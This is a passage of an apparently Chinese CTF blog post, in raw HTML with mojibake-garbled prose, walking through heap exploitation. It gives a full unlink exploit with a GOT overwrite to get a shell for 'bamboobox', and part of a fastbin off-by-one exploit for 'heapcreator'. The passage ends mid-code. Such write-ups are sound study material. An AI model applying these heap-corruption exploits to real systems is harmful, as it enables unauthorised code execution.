punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p>removeåŠŸèƒ½åšçš„æŒºå¥½çš„ï¼Œè¯¥ç½®nullä¹Ÿéƒ½ç½®nulläº†</p><p>å‡½æ•°åˆ†æå®Œäº†ï¼Œæ¥ç€å°±æ¥æ„æ€å¦‚ä½•åˆ©ç”¨<br>è¿˜æ˜¯å…ˆå°è£…ä¸€æ³¢å‡½æ•°</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> length<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">remove</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span></code></pre><p>æ—¢ç„¶æœ‰ä¸¥é‡çš„å †æº¢å‡ºæ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»»æ„æ„é€ å †ï¼Œæ»¡è¶³unlinkçš„åˆ©ç”¨æ¡ä»¶<br>å…ˆmallocä¸‰ä¸ªchunk</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#è¦ç”¨æ¥æº¢å‡ºçš„chunk  chunk0</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#victim chunk      chunk1</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#é˜²æ­¢ä¸Šé¢çš„chunk freeä¹‹åå’Œtop chunkåˆå¹¶  chunk2</span></code></pre><p>çœ‹ä¸€ä¸‹æ­¤æ—¶çš„å †ç»“æ„<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/13.jpg" alt=""><br>æ¥ç€æˆ‘ä»¬å¼€å§‹æ„é€ fakechunk<br>æˆ‘ä»¬çš„ç›®çš„æ˜¯æº¢å‡ºåˆ°chunk1çš„pre_sizeå’Œsizeä½ï¼Œé™¤å»chunk0çš„headerï¼Œæˆ‘ä»¬è‡³å°‘è¦ç¼–è¾‘0x40-0x10+0x10=0x40å¤§å°</p><pre class=" language-python"><code class="language-python">fake_chunk<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#pre_size</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#size</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x18</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fd</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#bk</span>fake_chunk<span class="token operator">+=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x20</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fakechunk size</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#chunk1 size,å¹¶ä¸”æ ‡è®°fakechunkä¸ºç©ºé—²çŠ¶æ€</span>change<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>fake_chunk<span class="token punctuation">)</span></code></pre><p>å…¶ä¸­ptr=0x6020c8,å³chunk0çš„æŒ‡é’ˆçš„åœ°å€<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/14.jpg" alt=""><br>æˆ‘ä»¬çš„fakechunkå·²ç»æ„é€ å¥½äº†</p><p>æ¥ä¸‹æ¥å°±æ˜¯unlinkäº†ï¼Œå½“æˆ‘ä»¬freeæ‰chunk1ï¼Œç³»ç»Ÿä¼šæ£€æµ‹åˆ°fakechunkä¹Ÿæ˜¯ç©ºé—²çŠ¶æ€ï¼Œå°±ä¼šå°†å®ƒä¸€å¹¶freeï¼Œæœ€ç»ˆç»“æœå°±æ˜¯åŸæœ¬åº”è¯¥æŒ‡å‘fakechunkçš„æŒ‡é’ˆPæŒ‡å‘äº†&amp;ptr-8çš„ä½ç½®ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/15.jpg" alt=""><br>ç¡®å®å¦‚æˆ‘ä»¬é¢„æ–™ä¸€æ ·ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ç¼–è¾‘chunk0çš„è¯ï¼Œå…¶å®æ˜¯åœ¨ç¼–è¾‘0x6020b0çš„å†…å­˜<br>æˆ‘ä»¬å†æ¥æ³„éœ²libcåŸºåœ°å€</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>æˆ‘ä»¬çœ‹çœ‹changeä¹‹å‰çš„0x6020b0å¤„çš„å†…å­˜<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/17.jpg" alt=""><br>changeä¹‹åçš„<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/18.jpg" alt=""><br>å¦‚å¦‚ä¸Šæ ‡æ³¨çš„ï¼Œæˆ‘ä»¬éœ€è¦ä¼ªé€ chunk0ï¼Œå¦åˆ™æ— æ³•ç»•è¿‡æ£€æŸ¥<br>ç„¶åæˆ‘ä»¬æ‰“å°å‡ºchunk0çš„å†…å®¹ï¼Œå³atoiçš„çš„åœ°å€ï¼Œæ ¹æ®è¿™ä¸ªæˆ‘ä»¬å¯ä»¥è®¡ç®—å‡ºlibcåŸºåœ°å€å’Œsystemå‡½æ•°åœ°å€ï¼Œæ¥ç€ï¼Œæˆ‘ä»¬å†æ¬¡ç¼–è¾‘chunk0ï¼Œå°†<code>elf.got['atoi']</code>æ›¿æ¢æˆ<code>system@got</code>ï¼Œè¿™æ ·ä¸€æ¥ï¼Œåªè¦æˆ‘ä»¬å†è¾“å…¥ä¸€ä¸ª<code>sh</code>ï¼Œatoi(sh)å°±å˜æˆäº†system(sh),å³å¯getshell<br>å®Œæ•´expå¦‚ä¸‹</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bamboobox'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io=remote("node3.buuoj.cn",28938)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'bamboobox'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> length<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">remove</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>ptr<span class="token operator">=</span><span class="token number">0x6020c8</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>fake_chunk<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#pre_size</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#size</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x18</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#fd</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#bk</span>fake_chunk<span class="token operator">+=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x20</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>fake_chunk<span class="token punctuation">)</span>remove<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0 : "</span><span class="token punctuation">)</span>atoi <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> atoi <span class="token operator">-</span> <span class="token number">0x36e80</span><span class="token keyword">print</span> <span class="token string">"libc:"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>system <span class="token operator">=</span> libc <span class="token operator">+</span> <span class="token number">0x45390</span>change<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h2><p>fastbin attackæ˜¯åˆ©ç”¨fastbinåˆ†é…åŸç†çš„æ¼æ´ï¼Œè¦æ±‚æœ‰å †æº¢å‡ºæ¼æ´ï¼Œé€šå¸¸æƒ…å†µä¸‹ä¸double freeã€use after freeå’Œchunk extendè¿ç”¨<br>è¯¦ç»†çš„è®²è§£å¯ä»¥çœ‹çœ‹<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698" target="_blank" rel="noopener">breezeO_o</a>å¸ˆå‚…çš„æ–‡ç« ï¼Œè®²çš„å¾ˆè¯¦ç»†ï¼Œæˆ‘è¿™é‡Œå°±è®°å½•ä¸€ä¸‹æˆ‘åšçš„ä¸¤é“é¢˜</p><h3 id="heapcreator"><a href="#heapcreator" class="headerlink" title="heapcreator"></a>heapcreator</h3><p>checksec<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/19.jpg" alt=""><br>64ä½æ–‡ä»¶ï¼Œå¯ä»¥å¤å†™gotè¡¨<br>è¿è¡Œä¸€ä¸‹<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/20.jpg" alt=""><br>å¢åˆ æŸ¥æ”¹ï¼Œæ²¡æ¯›ç—…<br>IDAåˆ†æ<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/21.jpg" alt=""><br>mainå‡½æ•°åˆ©ç”¨switché€‰æ‹©åŠŸèƒ½<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/22.jpg" alt=""><br>åˆ†æcreateåŠŸèƒ½<br>æœ€å¤§èƒ½åˆ›å»ºåæ¬¡<br>ç„¶åä¼šå…ˆmallocä¸€ä¸ª0x10(å®é™…ä¸º0x20)å¤§å°çš„chunk(ç§°ä¹‹ä¸ºheap)ï¼Œå…¶æŒ‡é’ˆå­˜å…¥heaparrayæ•°ç»„ä¸­<br>æ¥ä¸‹æ¥åˆ†é…ç”¨æˆ·æŒ‡å®šå¤§å°çš„chunk(content)ï¼Œå…¶sizeå­˜å…¥heapæ•°æ®æ®µçš„ç¬¬ä¸€ä¸ªå…«å­—èŠ‚ä¸­(å³fdä½)ï¼Œcontentçš„æŒ‡é’ˆå­˜å…¥heapçš„ç¬¬äºŒä¸ªå…«å­—èŠ‚å½“ä¸­(å³bkä½)<br>heapç»“æ„å¦‚ä¸‹</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> heap <span class="token punctuation">{</span>    size_t size <span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>content <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/23.jpg" alt=""><br>åˆ†æeditåŠŸèƒ½<br>æ ¹æ®indexå¯»æ‰¾chunk<br>å¦‚æœå­˜åœ¨åˆ™å¯ä»¥ç¼–è¾‘<br>ä½†è¯»å…¥contentçš„æ—¶å€™å­˜åœ¨off-by-oneæ¼æ´ï¼Œå¦‚å›¾æ‰€ç¤º<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/24.jpg" alt=""><br>è¿™å¯¼è‡´æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„sizeä½<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/25.jpg" alt=""><br>åˆ†æshowåŠŸèƒ½<br>åŒæ ·æ ¹æ®indexå¯»æ‰¾chunkï¼Œå¦‚æœå¯¹åº”çš„heaparrayå­˜åœ¨åˆ™è¾“å‡ºsizeå’Œcontent<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/26.jpg" alt=""><br>æœ€ååˆ†ædeleteåŠŸèƒ½<br>deleteåŠŸèƒ½æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œfreeçš„åŒæ—¶å°†æŒ‡é’ˆç½®0</p><p>æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œç¨‹åºå­˜åœ¨çš„æ¼æ´å­˜åœ¨äºedit<br>å…ˆé”‹è£…ä¸€ä¸‹å‡½æ•°</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>æ€è€ƒä¸€ä¸‹å¦‚ä½•getshellï¼Œç¨‹åºåªå¼€å¯äº†Partial RELROï¼Œé‚£ä¹ˆå¯ä»¥å°†free@gotä¿®æ”¹æˆsystem@gotï¼Œå†å¤Ÿé€ å‡ºä¸€ä¸ªå†…å®¹ä¸º/bin/shçš„chunkï¼Œå°†å…¶freeå³å¯<br>é‚£ä¹ˆæˆ‘ä»¬å…ˆåˆ›å»º2ä¸ªchunk(å®é™…ä¸Šä¸€å…±åˆ›å»ºäº†4ä¸ª)</p><pre class=" language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span></code></pre><p>æ­¤æ—¶å †ç»“æ„å¦‚ä¸‹<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/27.jpg" alt=""><br>æˆ‘ä»¬å°†ç¬¬ä¸€ä¸ªcontentèµ‹å€¼ä¸º/bin/shï¼Œå¹¶ä¸”é€šè¿‡æº¢å‡ºå°†ä¸‹é¢ä¸¤ä¸ªchunkåˆå¹¶ä¸ºä¸€ä¸ª</p><pre class=" language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>å †ç»“æ„å¦‚ä¸‹<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/28.jpg" alt=""><br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸçš„å°†heap[1]çš„å¤§å°ä¿®æ”¹æˆäº†heap[1]+content[1]<br>æˆ‘ä»¬deleteæ‰heap[1]ï¼Œå°±å°†contentä¸€èµ·freeæ‰äº†ï¼Œfastbinä¸­å°±å­˜åœ¨äº†ä¸€ä¸ª0x20å¤§å°å’Œ0x40å¤§å°çš„chunkã€‚ä¹‹åæˆ‘ä»¬å†ç”³è¯·ä¸€ä¸ªå¤§å°ä¸º0x30(å®é™…ä¸º0x40)çš„chunkï¼Œé¦–å…ˆä¼šmallocä¸€ä¸ª0x20å¤§å°çš„chunkä½œä¸ºheapï¼Œè¿™æ ·åŸæœ¬ä½œä¸ºold content[1]çš„chunkå°±è¢«åˆ†é…ç»™äº†new heap[1],è€Œåˆ†é…ç»™new content[1]çš„0x40å¤§å°çš„chunkåˆ™åŒ…å«äº†old heap[1]+old content[1],ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶new content[1]æ¥ä¿®æ”¹new heap[1]dçš„å€¼ã€‚<br>äºæ˜¯æˆ‘ä»¬å°†new heap[1]æŒ‡å‘new content[1]çš„æŒ‡é’ˆæ”¹ä¸ºfree@gotï¼Œè¿™æ ·ï¼Œå½“æˆ‘ä»¬è¾“å‡ºnew content[1]æ—¶ï¼Œå°±ä¼šå»è¾“å‡ºfreeåœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œä»è€Œæ³„éœ²libcåŸºåœ°å€</p><pre class=" language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span>  p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content : "</span><span class="token punctuation">)</span>data <span class="token operator">=</span> io<span class="token 